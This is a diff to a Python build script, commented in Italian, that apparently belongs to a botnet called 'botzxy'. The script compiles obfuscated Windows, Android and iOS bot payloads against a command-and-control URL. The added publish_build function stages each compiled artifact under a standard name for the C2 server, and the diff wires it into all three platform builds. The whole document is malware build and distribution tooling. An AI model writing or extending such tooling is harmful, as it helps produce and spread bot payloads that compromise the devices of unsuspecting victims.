@@ -74,6 +74,22 @@ def obfuscate_file(input_file, output_file):
         print_error(f"Errore offuscamento: {e}")
         return False
 
+def publish_build(src_path, platform):
+    """Copia l'artefatto compilato in builds/ con nome standard per il C2."""
+    if not src_path or not os.path.exists(src_path):
+        print_warning(f"Nessun file da pubblicare per {platform}")
+        return False
+    os.makedirs('builds', exist_ok=True)
+    ext = { 'windows':'.exe', 'android':'.apk', 'ios':'.ipa' }[platform]
+    dest = os.path.join('builds', f'botzxy_{platform}{ext}')
+    try:
+        shutil.copy2(src_path, dest)
+        print_success(f"Pubblicato in builds/: {dest} ({os.path.getsize(dest)//1024} KB)")
+        return True
+    except Exception as e:
+        print_error(f"Publish fallito: {e}")
+        return False
+
 def build_windows(c2_url, obfuscate=True):
     print_section("BUILD WINDOWS (.exe)")
     
@@ -119,6 +135,7 @@ def build_windows(c2_url, obfuscate=True):
             print_success(f"EXE creato: {exe_path}")
             size = os.path.getsize(exe_path) / (1024 * 1024)
             print_info(f"Dimensione: {size:.2f} MB")
+            publish_build(exe_path, 'windows')
             return True
     else:
         print_error(f"Errore compilazione: {result.stderr.decode()[:200]}")
@@ -180,14 +197,15 @@ warn_on_root = 1
     if result.returncode == 0:
         apk_files = glob.glob(os.path.join(apk_dir, 'bin', '*.apk'))
         if apk_files:
-            os.makedirs('dist', exist_ok=True)
-            for apk in apk_files:
-                dest = os.path.join('dist', os.path.basename(apk))
-                shutil.copy2(apk, dest)
-                print_success(f"APK creato: {dest}")
-                size = os.path.getsize(dest) / (1024 * 1024)
-                print_info(f"Dimensione: {size:.2f} MB")
-            return True
+                os.makedirs('dist', exist_ok=True)
+                for apk in apk_files:
+                    dest = os.path.join('dist', os.path.basename(apk))
+                    shutil.copy2(apk, dest)
+                    print_success(f"APK creato: {dest}")
+                    size = os.path.getsize(dest) / (1024 * 1024)
+                    print_info(f"Dimensione: {size:.2f} MB")
+                    publish_build(dest, 'android')
+                return True
     else:
         print_error(f"Errore compilazione APK: {result.stderr.decode()[:200]}")
         return False
@@ -263,6 +281,7 @@ def build_ios(c2_url, obfuscate=True):
         print_success(f"IPA creato: {ipa_path}")
         size = os.path.getsize(ipa_path) / (1024 * 1024)
         print_info(f"Dimensione: {size:.2f} MB")
+        publish_build(ipa_path, 'ios')
         return True
     else:
         print_error("IPA non creato")
